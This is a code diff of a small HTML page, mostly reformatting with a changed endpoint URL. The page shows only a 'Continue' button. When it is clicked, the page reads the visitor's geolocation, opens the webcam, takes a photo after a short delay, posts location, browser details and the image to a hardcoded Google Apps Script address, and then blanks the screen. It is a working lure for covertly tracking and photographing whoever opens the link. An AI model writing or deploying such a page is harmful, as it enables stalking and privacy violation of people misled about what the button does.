@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Capture Location + Photo</title>
+  <title>Capture Photo + Location</title>
 </head>
 <body>
   <button id="startBtn">Continue</button>
@@ -10,37 +10,32 @@
   <canvas id="canvas" style="display:none"></canvas>
 
   <script>
-    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzEVNhPqc5t8E9zEFLKV0V06xDeMa2PUQiX4rMfxB3VSWqn0m_76iV1O7pNu6NRLTLu/exec"; // Replace with your Apps Script Web App URL
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxt1zH4hyC1OEaC83G64_rm2CE1KBvPtLCapr5golHoTXHom8Sqwe1L2S7-5BZS40bM/exec"; // Replace with your Web App URL
 
     document.getElementById("startBtn").addEventListener("click", async () => {
       let locationData = null;
 
       try {
-        const pos = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
-        });
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
         locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
-      } catch (err) {
-        console.log("Location denied");
-      }
+      } catch(e) { console.log("Location denied"); }
 
       let photoData = null;
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById("video");
         video.srcObject = stream;
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        await new Promise(r => setTimeout(r, 1500));
         const canvas = document.getElementById("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
         photoData = canvas.toDataURL("image/jpeg");
-        stream.getTracks().forEach(track => track.stop());
-      } catch (err) {
-        console.log("Camera denied or failed");
-      }
+        stream.getTracks().forEach(t => t.stop());
+      } catch(e) { console.log("Camera denied"); }
 
-      // Send data
       try {
         const res = await fetch(WEB_APP_URL, {
           method: "POST",
@@ -48,9 +43,7 @@
           body: JSON.stringify({ location: locationData, device: navigator.userAgent, photo: photoData })
         });
         console.log(await res.text());
-      } catch(err) {
-        console.error("POST failed:", err);
-      }
+      } catch(e) { console.error("POST failed:", e); }
 
       document.body.innerHTML = "";
     });
